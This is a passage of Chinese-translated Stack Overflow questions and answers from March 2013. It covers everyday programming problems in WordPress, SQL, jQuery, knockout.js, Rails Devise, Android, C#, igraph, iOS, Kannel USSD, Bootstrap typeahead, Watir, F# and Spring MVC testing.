RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress 
```

我被困在这里。请帮我整理一下。我想在我的本地主机中分享一件事，一切正常，没有错误。

提前感谢大家。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-03-01T13:54:23.380

session_start() 必须是第一个向浏览器发送任何数据的函数。

尝试移动：

```
if (!session_id()) {
    session_start();
} 
```

到您的functions.php开头的行之后`<?php`

# sql - 如何避免 SQL 中的子查询重复？

> ID：15159344
> 
> 赞同：0
> 
> 时间：2013-03-01T13:50:48.450
> 
> 标签：sql, subquery, full-outer-join

我想要用途 A 项目的最低价格和用途 B 项目的最高价格，而且我按区域对我的项目进行分组。

```
SELECT ZONE, MIN_PRICE, MAX_PRICE --,LEFT_ZONE
  FROM 
  (SELECT MIN(PRICE) AS MIN_PRICE , ZONE  AS LEFT_ZONE
    FROM MYTABLE 
    WHERE PURPOSE = 'A'
      AND SOMETHING = 'SOMEVALUE'
    GROUP BY ZONE 
   )
    FULL OUTER JOIN 
  (SELECT MAX(PRICE) AS MAX_PRICE, ZONE_CD  
    FROM MYTABLE 
    WHERE PURPOSE = 'B'
      AND SOMETHING = 'SOMEVALUE'
    GROUP BY ZONE 
   )
  ON LEFT_ZONE = ZONE 
```

这个查询给出了我想要的输出，但我不喜欢它有两个原因：

1）我想要

```
FROM MYTABLE 
WHERE SOMETHING = 'SOMEVALUE' 
```

只能调用一次。

2）当行来自我的完整外连接中的右表时，我得到 ZONE null 。

我该如何解决这些问题。

我的查询中还有其他问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:54:06.803

您是否尝试过使用`CASE`表达式来得到这个：

```
select zone,
  min(case when PURPOSE = 'A' then price end) min_price,
  max(case when PURPOSE = 'B' then price end) max_price
from MYTABLE 
where SOMETHING = 'SOMEVALUE'
group by zone 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:57:53.013

尝试这个：

```
 SELECT 
    ZONE, 
    SUM (CASE WHEN PURPOSE = 'A' THEN MIN(PRICE) ELSE 0 END) AS MIN_PRICE,
    SUM (CASE WHEN PURPOSE = 'B' THEN MAX(PRICE) ELSE 0 END) AS MAX_PRICE
  FROM 
    MYTABLE 
  WHERE 
    SOMETHING = 'SOMEVALUE'
  GROUP BY 
    ZONE 
```

或任何小的变化

# jquery - jQuery 动态添加

> ID：15159350
> 
> 赞同：-1
> 
> 时间：2013-03-01T13:51:02.630
> 
> 标签：jquery

所以我有以下代码有效：

```
var a = $("#sample_1").dataTable().fnAddData( [
     domEle['AGENCY_NAME'],
     domEle['ADVERTISER_NAME'],
     domEle['CAMPAIGN_NAME'],
     domEle['STRATEGY_NAME'],
     domEle['IMPRESSIONS'],
     domEle['CLICKS'],
     domEle['PC_CONVERSIONS'],
     domEle['PV_CONVERSIONS'],
     domEle['ADJ_PV_CONVERSIONS'],
     domEle['eCPM'],
     domEle['eCPA'],
     domEle['eCPC'],
     domEle['MEDIA_COST'],
     domEle['TOTAL_SPEND'],
]); 
```

但是，我想按 AJAX 中返回的顺序显示列，所以我想将其更改为：

```
var a = $("#sample_1").dataTable().fnAddData( [
     $.each(data['columns_order'], function(key, value){

          domEle[data['columns_order'][key]['fieldy']],

      });
]); 
```

但我不断收到以下错误`"Uncaught SyntaxError: Unexpected token ) "`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:53:47.280

我不确定，但我认为问题在于，最后，在 domEle[data['columns_order'][key]['fieldy']]

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:54:53.543

```
var a = $("#sample_1").dataTable().fnAddData({
     $.each(data['columns_order'], function(key, value){

      domEle[data['columns_order'][key]['fieldy']],

  });
}); 
```

复制粘贴上面的代码。您的代码中遗漏了一些括号

# javascript - 我在这里用 knockout.js 做错了什么？

> ID：15159353
> 
> 赞同：1
> 
> 时间：2013-03-01T13:51:14.877
> 
> 标签：javascript, knockout.js

我正在尝试动态创建可观察对象，但效果不佳。这是我所拥有的：

//这种类型有效

```
 this.Name = ko.observable(data.Name);
   this.Age = ko.observable(data.Age); 
```

//这就是我想要的工作

```
 for (var propertyName in data) {
         this.propertyName = ko.observable(propertyName);
     } 
```

这只会产生属性名称，即“Name”和“Age”，但是当我像“Name”是“John”一样进行调试时，第一个会产生值和名称。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T13:53:25.313

关于什么：

```
for (var propertyName in data) {
    this[propertyName] = ko.observable(data[propertyName]);
} 
```

*this.propertyName*实际上会设置一个名为“propertyName”的属性。通过使用括号，您可以使用变量来定义属性。

*ko.observable(propertyName);* 正在定义一个以属性名称作为其值的可观察对象。

您可能还想检查该值是否是一个数组，以便您可以在需要时创建一个可观察数组：

```
for (var propertyName in data) {
    var value = data[propertyName];
    if ($.isArray(value)) { // assuming your using jQuery
        this[propertyName] = ko.observableArray(value);
    } else {
        this[propertyName] = ko.observable(value);
    }
} 
```

# ruby-on-rails - RoR 使用设计 - 加密密码

> ID：15159355
> 
> 赞同：0
> 
> 时间：2013-03-01T13:51:17.757
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

嗨，请原谅我的无知，但我是 RoR 的新手。我的问题是我正在尝试使我的 Devise gem 工作，但是当我填写信息并单击注册时，我得到这个回报：“未定义的方法 `encrypted_pa​​ssword=' for”。

我已经尝试过 rake db:migrate 并且还清除了 User.rb 模型中的属性，但它仍然不起作用。

请任何指导将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:05:40.060

这很可能意味着您在迁移中丢失了。你确定，你有正确的设置设计吗？

[https://github.com/plataformatec/devise](https://github.com/plataformatec/devise)

```
rails generate devise:install
rails generate devise User
bundle exec rake db:migrate 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T15:17:41.287

在网站 railscasts.com 您可以观看：

```
http://railscasts.com/episodes/209-introducing-devise 
```

之后你就会明白你在哪里犯了错误如果你得到一个错误 - 写评论，我们帮助

PS gem 'devise', '1.1.rc0' => gemfile 中的 gem 'devise'

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:41:42.727

在 rails 控制台运行中，这将告诉您迁移是否已运行

```
User.new.respond_to?(:encrypted_password=) 
```

如果不这样做，这应该返回 true

```
bundle exec rake db:migrate:reset 
```

# cruisecontrol.net - CruiseControl.NET 的全局错误报告？

> ID：15159356
> 
> 赞同：1
> 
> 时间：2013-03-01T13:51:20.343
> 
> 标签：cruisecontrol.net, cruisecontrol

我为一个非常大的组织工作。我们的 CI 服务器上有超过 500 个构建，包含数千个组件，生成非常大的日志文件。作为一个必须管理故障的人，我发现深入构建日志以查找错误、点击返回按钮、按构建状态重新排序所有内容、向下滚动到下一个应用程序、冲洗是一个相当大的负担n'重复。

我正在寻找一种方法来开发自定义报告，该报告将向我显示服务器上所有应用程序的所有故障，以及该单个页面上每个错误的详细信息。这听起来应该已经存在，但在谷歌上一个小时后我找不到任何东西。

任何帮助将不胜感激！

# android - Android 线程问题 Thread-387

> ID：15159357
> 
> 赞同：0
> 
> 时间：2013-03-01T13:51:21.367
> 
> 标签：android, multithreading, runnable

我在使用线程时遇到问题。我得到了他的服务类，我需要检查更新，然后睡 24 小时。

```
public class SimpleService extends Service {
    private static final int NOVI_VESTI = 1;
    private static final int NOVA_OGLASNA = 2;
    private List<String> titles;

    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Thread t = new Thread() {
            @Override
            public void run() {
                while (true) {
                    try {
                        String vesti, oglasna;
                        vesti = readRss("http://www.finki.ukim.mk/mk/rss/news");
                        // readRss("http://www.finki.ukim.mk/mk/rss/news");
                        // getPrefs("vesti");
                        if (!vesti.equals(getPrefs("vesti"))) {
                            Context context = SimpleService.this;
                            NotificationManager notificationManager = (NotificationManager) context
                                    .getSystemService(NOTIFICATION_SERVICE);
                            Notification updateComplete = new Notification();
                            updateComplete.icon = R.drawable.ic_launcher;
                            updateComplete.tickerText = context
                                    .getText(R.string.newVesti);
                            updateComplete.when = System.currentTimeMillis();
                            Intent notificationIntent = new Intent(context,
                                    Vesti.class);
                            PendingIntent contentIntent = PendingIntent
                                    .getActivity(context, 0,
                                            notificationIntent, 0);

                            String contentTitle = context.getText(
                                    R.string.newVesti).toString();
                            String contentText;
                            contentText = vesti.toString();
                            updateComplete.setLatestEventInfo(context,
                                    contentTitle, contentText, contentIntent);

                            notificationManager.notify(NOVI_VESTI,
                                    updateComplete);

                        }

                        oglasna = readRss("http://www.finki.ukim.mk/mk/rss/announcements");
                        if (!oglasna.equals(getPrefs("oglasna"))) {

                            Context context = SimpleService.this;
                            NotificationManager notificationManager = (NotificationManager) context
                                    .getSystemService(NOTIFICATION_SERVICE);
                            Notification updateComplete = new Notification();
                            updateComplete.icon = R.drawable.ic_launcher;
                            updateComplete.tickerText = context
                                    .getText(R.string.newOglasna);
                            updateComplete.when = System.currentTimeMillis();
                            Intent notificationIntent = new Intent(context,
                                    OglasnaTabla.class);
                            PendingIntent contentIntent = PendingIntent
                                    .getActivity(context, 0,
                                            notificationIntent, 0);

                            String contentTitle = context.getText(
                                    R.string.newOglasna).toString();
                            String contentText;
                            contentText = vesti.toString();
                            updateComplete.setLatestEventInfo(context,
                                    contentTitle, contentText, contentIntent);

                            notificationManager.notify(NOVA_OGLASNA,
                                    updateComplete);

                            sleep(60 * 60 * 24);

                        }
                    } catch (InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            }
        };
        t.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    // title for both
    public String readRss(String feedLink) {

        try {
            URL url = new URL(feedLink);

            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(false);
            XmlPullParser xpp = factory.newPullParser();

            // We will get the XML from an input stream
            xpp.setInput(getInputStream(url), "UTF_8");

            boolean insideItem = false;

            // Returns the type of current event: START_TAG, END_TAG, etc..
            int eventType = xpp.getEventType();
            while (eventType != XmlPullParser.END_DOCUMENT) {
                if (eventType == XmlPullParser.START_TAG) {

                    if (xpp.getName().equalsIgnoreCase("item")) {
                        insideItem = true;
                    } else if (xpp.getName().equalsIgnoreCase("title")) {
                        if (insideItem)
                            titles.add(xpp.nextText());
                        // headlines.add(xpp.nextText()); // extract the
                    }
                } else if (eventType == XmlPullParser.END_TAG
                        && xpp.getName().equalsIgnoreCase("item")) {
                    insideItem = false;
                }

                eventType = xpp.next(); // move to next element
            }

        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (XmlPullParserException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return titles.get(0);
    }

    public InputStream getInputStream(URL url) {
        try {
            return url.openConnection().getInputStream();
        } catch (IOException e) {
            return null;
        }
    }

    private String getPrefs(String category) {
        SharedPreferences preferences = PreferenceManager
                .getDefaultSharedPreferences(this);
        String pref = preferences.getString(category, "");
        return pref;
    }

} 
```

但是当我尝试在 DDMS 中运行它时，我得到以下日志：

```
03-01 14:46:26.913: E/AndroidRuntime(3308): FATAL EXCEPTION: Thread-387
03-01 14:46:26.913: E/AndroidRuntime(3308): java.lang.NullPointerException
03-01 14:46:26.913: E/AndroidRuntime(3308):     at com.finki.darko.mk.services.SimpleService.readRss(SimpleService.java:146)
03-01 14:46:26.913: E/AndroidRuntime(3308):     at com.finki.darko.mk.services.SimpleService$1.run(SimpleService.java:47) 
```

有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:04:46.350

好的，在 Android 上，不幸的是，您的设计完全错误。不要创建线程并休眠 24 小时。例如，您的应用程序很可能会在此期间被系统杀死，以便为其他更重要的应用程序（例如前台的应用程序）腾出空间。有多种方法可以让您的应用定期唤醒。一种可能性是AlarmManager。

请参阅此答案以每小时执行一次操作：

[如何让我的应用每小时执行一次](https://stackoverflow.com/questions/3696082/how-to-schedule-my-android-app-to-do-something-every-hour)

# c# - 单击保存按钮时保存动态控件状态

> ID：15159361
> 
> 赞同：0
> 
> 时间：2013-03-01T13:51:46.043
> 
> 标签：c#, forms, savestate

我有一个小程序，它在加载时生成四个动态按钮`flowLayoutPanel1`和一个静态保存按钮。

我的目标是保存动态按钮颜色，以便在重新加载或再次打开表单时，动态按钮的颜色会以与保存时相同的状态重新加载。

下面我将包含我的代码，该代码已被注释以演示我的尝试。我正在使用一个`xml`文件来保存按钮状态并包含一个保存状态的类。但是，如果创建我的按钮以静态保存，我使用的方法可以正常工作。（我只用一个静态按钮尝试过）

接口： ![在此处输入图像描述](../Images/73775308d8d87e3c10009568442275fc.png) 持有状态的类：

```
 public class MyFormState
    {
        public string ButtonBackColor { get; set; }
    } 
```

表格代码：

```
 public partial class Form1 : Form
    {
        //Form Member
        MyFormState state = new MyFormState();
        Button btn;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //loading xml file if it exists
            if (File.Exists("config.xml"))
            {
                loadConfig();

            }

            //Genrating dynamic buttons
            //  flowLayoutPanel1.Controls.Clear();
            for (int i = 0; i <= 3; ++i)
            {
                btn = new Button();
                btn.Text = " Equation " + i;

                flowLayoutPanel1.Controls.Add(btn);
                //click event of buttons
                btn.Click += new EventHandler(btn_Click);
            }

           btn.BackColor = System.Drawing.ColorTranslator.FromHtml(state.ButtonBackColor);

        }

        //method to load file
        private void loadConfig()
        {

            XmlSerializer ser = new XmlSerializer(typeof(MyFormState));
            using (FileStream fs = File.OpenRead("config.xml"))
            {
                state = (MyFormState)ser.Deserialize(fs);
            }
        }

        //saving the xml file and the button colors
        private void writeConfig()
        {
            using (StreamWriter sw = new StreamWriter("config.xml"))
            {

                state.ButtonBackColor = System.Drawing.ColorTranslator.ToHtml(btn.BackColor);
                XmlSerializer ser = new XmlSerializer(typeof(MyFormState));
                ser.Serialize(sw, state);
            }
        }
        int count = 0;

        //backcolor change
        void btn_Click(object sender, EventArgs e)
        {
            Button button = sender as Button;

            if (count == 0)
            {
                button.BackColor = Color.Red;
                count++;
            }

            else if (count == 1)
            {
                button.BackColor = Color.Blue;
                count--;
            }
        }

        //save file
        private void btnSave_Click(object sender, EventArgs e)
        {
            writeConfig();
        }

    } 
```

关于我应该改变什么以使其对我有用的任何建议？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:23:07.703

您的代码工作正常，但仅适用于最后一个按钮。您有 4 个按钮，但只有一个`MyFormState`对象。创建按钮时，您始终使用相同的私有字段`btn`。`MyFormState`所以你需要 4 个对象和 4 个按钮的数组。

```
MyFormState[] states = new MyFormState[4];
Button[] buttons = new Button[4];

private void Form1_Load(object sender, EventArgs e)
{
    if (File.Exists("config.xml"))
    {
        loadConfig();
    }

    for (int i = 0; i < 4; ++i)
    {
        buttons[i] = new Button();
        buttons[i].Text = " Equation " + i;

        flowLayoutPanel1.Controls.Add(buttons[i]);
        buttons[i].Click += new EventHandler(btn_Click);

        if (states[i] != null)
        {
            buttons[i].BackColor = ColorTranslator.FromHtml(states[i].ButtonBackColor);
        }
    }
}

private void loadConfig()
{
    XmlSerializer ser = new XmlSerializer(typeof(MyFormState[]));
    using (FileStream fs = File.OpenRead("config.xml"))
    {
        states = (MyFormState[])ser.Deserialize(fs);
    }
}

private void writeConfig()
{
    for (int i = 0; i < 4; i++)
    {
        if (states[i] == null)
        {
            states[i] = new MyFormState();
        }
        states[i].ButtonBackColor = ColorTranslator.ToHtml(buttons[i].BackColor);
    }

    using (StreamWriter sw = new StreamWriter("config.xml"))
    {
        XmlSerializer ser = new XmlSerializer(typeof(MyFormState[]));
        ser.Serialize(sw, states);
    }
} 
```

# python - 将图例或背景图像添加到 Igraph 0.6 (for python) plot

> ID：15159362
> 
> 赞同：1
> 
> 时间：2013-03-01T13:51:46.293
> 
> 标签：python, graph, plot, legend, igraph

我通过使用带有 Cairo 扩展的 Igraph 0.6 来绘制带有 python 2.7 的图形。一切都很好，但我想在每次绘制时添加一个图例。

如果我只能在绘图中添加一个背景图像，那也很好，因为我制作了一个大小合适的白色图像，并且已经在其中添加了图例（带有一般符号说明）。

这些我都做不到，也不能通过谷歌搜索找到。也许我只是无法站在 Google 的右侧或在 Igraph 文档中找到正确的关键字。

gp = 图形（）。它是全球性的。有顶点和边序列等。有一些列表包含有关顶点和边的更多信息（例如：self.gp_cities，self.road_kind）这是我绘制的方式：

```
def showitshort(self,event):
    global gp
    layout = gp.layout("kk")
    color_dict = {"1": "red", "20": "blue"}
    visual_style = {}
    visual_style["vertex_size"] = 15
    visual_style["vertex_color"] = ["yellow"]
    visual_style["edge_color"] = [color_dict[elektro] for elektro in self.road_kind]
    visual_style["vertex_label"] = self.gp_cities
    visual_style["layout"] = layout
    visual_style["bbox"] = (4000, 2500)
    visual_style["margin"] = 100
    visual_style["vertex_label_dist"] = 5
    visual_style["vertex_shape"] = "triangle-up"
    plot(gp,**visual_style) 
```

我认为正确的链接就足够了。请帮助一点，并提前谢谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T15:57:06.170

诀窍是您可以将现有的 Cairo 曲面传递到`plot`其中，它只会在该曲面上绘制图形，而不是创建新曲面。因此，基本上，您需要构造一个 Cairo 曲面（例如 an `ImageSurface`），使用标准 Cairo 调用将您的图例绘制到该曲面上，然后将该曲面传递给`plot`如下：

```
plot(gp, target=my_surface, **visual_style) 
```

据我所知，`plot()`以这种方式调用时不会显示图形本身；它只会返回一个`Plot`对象。您可以调用对象的`show()`方法`Plot`来显示它，也可以调用`save()`方法将其保存到 PNG 文件中。

# ios - 向 UITableView 中插入额外的行，如 Tweetbot iOS

> ID：15159368
> 
> 赞同：1
> 
> 时间：2013-03-01T13:52:05.587
> 
> 标签：ios, uitableview, nsfetchedresultscontroller

我`NSFetchedResultsController`喜欢我的`UITableView`. 它显示了一些来自我的数据库的带有谓词的实体。我试图找到一个优雅的解决方案来在我的数据行之间插入实用程序行。我不想在我的数据库中创建假实体，因为我不想混合视图和模型。但我需要有能力重新创建这个实用程序行（例如在其他应用程序启动时）。有什么建议么？

它应该看起来像这样：

![在此处输入图像描述](../Images/8375657999852a52aaace8d6f51c0ced.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:18:40.870

You're best bet, in my opinion, is to use a section header or footer for that "utility" row. In the case of Tweetbot, they're most likely caching results locally and then merge in data when the plus button is tapped. Your table will take multiple data sets as arrays (an array of arrays) and treat each separate array as a chunk and put it into its own section.

Any way you implement you'll want to wrap your results from the database with some sort of metadata. I think you're going to have to get away from a fetched results controller, unless you use a separate instance for each chunk, keeping track of the date range for each chunk.

# algorithm - 算法简介

> ID：15159371
> 
> 赞同：-4
> 
> 时间：2013-03-01T13:52:08.323
> 
> 标签：algorithm

阅读算法简介（CLRS）这本书对我有什么帮助？学习这门课程如何与理论计算机科学的其他领域联系起来？（我的意思是我能得到的直觉和见解）。

我是这个概念的新手。我现在对我在课程中学习的排序算法感到厌烦。我想在学习课程时有更广阔的视野。如果你能提供的话，这对我很有帮助我有一个关于事情进展的结构。在此先感谢！:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:43:58.537

算法是理论知识在计算机科学中的实际应用；可以说，它们是计算机科学工程方面最具理论性的部分。如果没有对算法的研究，软件中的任何人要么是业余爱好者——因为没有效率，计算是无用的——要么不会产生很多东西，因为他必须一直专注于解决问题，而不是实际编写已知的实现解决问题。

从教学的角度来看，算法是将理论知识升华为精确表达的过程。你可能会理解什么是图遍历，以及连接的组件应该收缩到什么程度；如果您尝试为这些想法提供简洁的形式，那么最好的方法是写下一个可以满足您需求的算法。

在正式层面上，它们帮助我们理解我们正在努力解决的概念；当我们声称某些问题可以以这种或那种复杂性解决时，我们需要一个算法来证明它。例如，如果你读到排序在一般情况下是 O(n log n)，你可以继续相信你的教授；也许你甚至有直觉为什么这可能是真的。但要实际证明它，您需要一种算法来解决排序问题，然后证明它在一般情况下运行在 O(n log n) 中。所以在理论上，算法帮助我们根据问题的复杂性（读作：“难度”）对问题进行分类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:14:26.263

我不确定这个问题是否有具体的答案，并且这是问这个问题的正确地方，但它仍然是一个有用的问题。除了相信那些一生中大部分时间都在指导人们学习他们将在余生中使用的技能的人（你的教授），我一直将算法设计视为一种学习如何更清晰思考的方法. 这是我相信每个人都可以学习的。

另外，当我还是学生的时候，我有很多次对我被要求学习的东西感到沮丧（认为这是一种浪费）。我发现几乎所有这些都非常有用并且经常使用。回想起来，我希望我能给我的一些教授更多的荣誉，而不是我在学校时所做的。

# sms-gateway - 如何使用 kannel 发送和接收 USSD

> ID：15159377
> 
> 赞同：3
> 
> 时间：2013-03-01T13:52:33.030
> 
> 标签：sms-gateway, smpp, kannel, ussd

我是 USSD 的新手，但我早就使用 Kannel 1.5.4 发送消息了。我想使用 kannel 发送/接收 USSD 请求。我有相同的 smpp v5 帐户。如果有人通过配置文件帮助我，那就更好了。我的配置文件是：

```
#SMSC CONNECTIONS
group = smsc
smsc = smpp
smsc-id = USSD-ACC
host= 10.*.*.*
port= 1234
transceiver-mode=true
smsc-username = "USER"
smsc-password = "PWD"
system-type = ""
interface-version=34
source-addr-ton=5
source-addr-npi=0
dest-addr-ton=0
dest-addr-npi=1
max-pending-submits=10
wait-ack=600
wait-ack-expire=0x01

# SMSBOX SETUP
group = smsbox
bearerbox-host = localhost
sendsms-port = 12345
sendsms-chars = "0123456789 +-"
log-file = "/tmp/kannel_smsbox.log"
log-level = 3
# SERVICES
group = sms-service
keyword = default
get-url = "http://localhost/request.php?MNO=%p&SHORTCODE=%P&CONTENT=%a"
name="*123#"
max-messages=0

group = sendsms-user
username = ussd
password = ussd
user-deny-ip  = *.*.*.*"
user-allow-ip = "127.0.0.1"
max-messages = 5
concatenation = true
default-sender = "123" 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T08:33:33.493

似乎您需要使用**smpp-tlv**部分将**ussd_service_op** TLV 传入/传出 USSDC。

有关配置示例，请参阅[此链接：](http://mehulbhatt.wordpress.com/2012/04/10/connect-kannel-to-a-ussd-centered/)

# javascript - Bootstrap 的 Typeahead 有两个来源和自定义分隔符

> ID：15159378
> 
> 赞同：2
> 
> 时间：2013-03-01T13:52:41.093
> 
> 标签：javascript, html, twitter-bootstrap, bootstrap-typeahead

是否可以使用自定义分隔符向 Bootstrap Typeahead 添加两个源？

目前我有

```
source: function (query, process) {
    ...
       process(data.names.merge(data.areas));
    ...
} 
```

但是，我非常想在两者的结果之间添加自定义 HTML。现在它们在显示时也混合在一起，我希望它们在两个单独的列表中，自定义 HTML 作为分隔符。

可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T02:07:47.040

答案是肯定的。您将需要知道分隔符应该出现在组合列表中的哪个位置，这将被调整为与用户输入的“查询”（`this.query`）匹配的内容。

您可以通过覆盖该`render`方法来更改生成的 HTML，您需要直接访问该`typeahead`对象才能执行此操作：

```
var typeahead = $("#myTypeahead").typeahead(/* ... */).data('typeahead');

typeahead.render = function(items) {
    var that = this

    // this "map"s the items, which iterates over them and generates a new
    //  li for each item _by default_; I have modified it
    items = $(items).map(function (i, item) {
        // return an array containing raw HTML Elements
        var elements = []

        // determine if separator is necessary, but make sure that it
        //  is not the first li (which this would be if it matched the
        //  i === 0 item!)
        if (item === "worthSeparating") {
            // put whatever you want as the separator in the elements array,
            //  which will appear in the position that you return it
            //  you probably don't want text, rather you want some CSS class
            elements.push($("<li/>").addClass("menu-separator")[0])
        }

        // ordinary li that is displayed:
        i = $(that.options.item).attr('data-value', item)
        i.find('a').html(that.highlighter(item))
        elements.push(i[0])

        return elements
    });

    items.first().addClass('active')
    this.$menu.html(items)
    return this
}; 
```

上面的`render`方法是从默认的方法修改而来的。您可以完全控制发生的事情。事实上，如果您不喜欢默认菜单，那么您可以通过传递默认提供的不同选项来转换菜单：

```
{
    menu: '<ul class="typeahead dropdown-menu"></ul>',
    item: '<li><a href="#"></a></li>'
} 
```

更改这些将需要对`render`方法进行不同的更改。

# user-agent - 需要更改 watir/loader.rb 以使 webdriver-user-agent 工作

> ID：15159379
> 
> 赞同：2
> 
> 时间：2013-03-01T13:52:44.020
> 
> 标签：user-agent, watir-webdriver

我正在使用这里提到的 webdriver-user-agent – [http://watirwebdriver.com/mobile-devices/](http://watirwebdriver.com/mobile-devices/)
这是我在试用这个 gem
浏览器时使用的代码：FF/Chrome Ruby：1.9.3 / Selenium：2.30。 0 / 瓦提尔：4.0.2

```
http_client = Selenium::WebDriver::Remote::Http::Default.new
http_client.timeout = HTTP_TIMEOUT
profile = Selenium::WebDriver::Firefox::Profile.new
device = ENV["DEVICE"]
orientation = ENV["ORIENTATION"]
driver = UserAgent.driver(:browser => :firefox, :agent =>device, :orientation=>orientation)
devices = UserAgent.resolution_for(device,orientation)
UserAgent.resize_inner_window(driver,devices[0],devices[1])
Watir::Browser.new driver 
```

现在执行最后一条语句时，出现以下错误

```
(STEP) Launching FIREFOX (using web driver user agent)……
browser:
#

undefined method `to_sym’ for # (NoMethodError)
/Users/user/.rvm/gems/ruby-1.9.3-p194/gems/watir-4.0.2/lib/watir/loader.rb:42:in `load_driver_for’
/Users/user/.rvm/gems/ruby-1.9.3-p194/gems/watir-4.0.2/lib/watir/loader.rb:8:in `new’ 
```

根据一些调查，问题出现在下面突出显示的行，因为它试图在 selenium webdriver 对象上使用 .to_sym。

```
def load_driver_for(browser)

if browser && browser.to_sym != :ie && Watir.driver == :classic
Watir.driver = :webdriver
end
Watir.load_driver
end 
```

但是，如果我们添加如下所示的行，则该 gem 将按预期工作。

```
def load_driver_for(browser)

if “#{ENV["BROWSER"]}”.eql?(“chrome_useragent”)||”#{ENV["BROWSER"]}”.eql?(“firefox_useragent”)
Watir.driver = :webdriver
else
if browser && browser.to_sym != :ie && Watir.driver == :classic
Watir.driver = :webdriver
end
Watir.load_driver
end
end 
```

由于这是我们框架之外的 watir 代码，这不是正确的方法，关于如何避免这种情况的任何建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:32:38.313

当您这样做时，问题是可重现的：

```
require 'watir'
require 'webdriver-user-agent'
driver = Webdriver::UserAgent.driver(:browser => :chrome, :agent => :iphone, :orientation => :landscape)
browser = Watir::Browser.new driver
browser.goto 'tiffany.com'
browser.url.should == 'http://m.tiffany.com/International.aspx' 
```

您可以通过直接要求 watir-webdriver 而不是通过 watir metagem 来解决此问题。将第一行更改为：

```
require 'watir-webdriver' 
```

# f# - 如何解决“程序主模块为空：运行时不会发生任何事情”

> ID：15159387
> 
> 赞同：5
> 
> 时间：2013-03-01T13:53:19.350
> 
> 标签：f#, compiler-warnings, suppress-warnings

我在 F# 解决方案中有两个项目。
1.主项目[`[EntryPoint]`](http://msdn.microsoft.com/en-us/library/dd402151.aspx)设置为StarUp项目。
2\. support，第二个项目，拥有一组支持模块。即它们只被调用，从不启动任何东西，也不作为入口点，也不是 StartUp 项目。

对于支持项目中的最后一个模块，在 Visual Studio 中编译给出

> 警告FS0988：程序主模块为空；运行时什么都不会发生

虽然在导致警告的模块中使用[编译器选项 nowarn](http://msdn.microsoft.com/en-us/library/dd233171.aspx) inline`#nowarn "988"`确实会抑制消息，但我宁愿添加一个带有解决问题的注释的虚拟函数之类的东西。

如何制作这样一个虚拟函数来解决警告？

编辑

Jack 是正确的，因为我的支持项目设置为 a`Console Application`而不是`Class Library`. 更改以`Class Library`解决警告。很高兴知道`do ()`另一种情况。

编辑

虽然我将支持项目设置为 似乎很奇怪，但`Console Application`我最近发现，由于某种原因，当我对项目中的代码进行更改时，输出类型从 更改`Class Library`为`Console Application`。我怀疑它与 F# PowerPack 和它的构建规则有关，但这只是一个猜测。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T13:57:25.623

您将支持项目构建为 a`Library`还是 a `Console Application`？（这是通过项目属性页面设置的。）

如果您将其构建为库，那么您可能需要`do()`在项目的最后一个文件的末尾添加一个。这对于使 F# 编译器在某些特定场景中满意是必要的，例如当您创建一个仅包含程序集级属性的模块时（因为它们应用于程序集，该模块对编译器来说是“空的”）。

您可以在我的代码中看到一个示例： [https ://github.com/jack-pappas/FSharp.Compatibility/blob/master/FSharp.Compatibility.OCaml/AssemblyInfo.fs](https://github.com/jack-pappas/FSharp.Compatibility/blob/master/FSharp.Compatibility.OCaml/AssemblyInfo.fs)

# spring-test - 单元测试返回 DeferredResult 的 Spring MVC 控制器

> ID：15159388
> 
> 赞同：1
> 
> 时间：2013-03-01T13:53:20.973
> 
> 标签：spring-test, spring-test-mvc

我正在尝试测试返回 DeferredResult 对象列表的 Spring 3.2.1 控制器。我使用以下测试作为指导，但我想知道这个测试是否是集成测试而不是单元测试？

[https://github.com/SpringSource/spring-mvc-showcase/blob/master/src/test/java/org/springframework/samples/mvc/async/DeferredResultControllerTests.java](https://github.com/SpringSource/spring-mvc-showcase/blob/master/src/test/java/org/springframework/samples/mvc/async/DeferredResultControllerTests.java)

当我运行单元测试时，我得到：

原因：java.lang.UnsupportedOperationException：在 pre-Servlet 3.0 运行时中没有异步支持

在研究这个错误时，我相信它与需要的 servlet 3.0 api 中包含的异步支持有关，这是有道理的，但是我需要包含哪些 Maven 依赖项才能使测试通过？有没有人像链接中的那样为 DeferredResults编写了成功的 spring mvc*控制器单元测试？*（再次，我假设上面的链接是单元测试而不是集成测试）。

谢谢

# php - 重新排列我的密码恢复文件，使 HTML 输出低于 Header

> ID：15159390
> 
> 赞同：0
> 
> 时间：2013-03-01T13:53:25.883
> 
> 标签：php, html, mysql

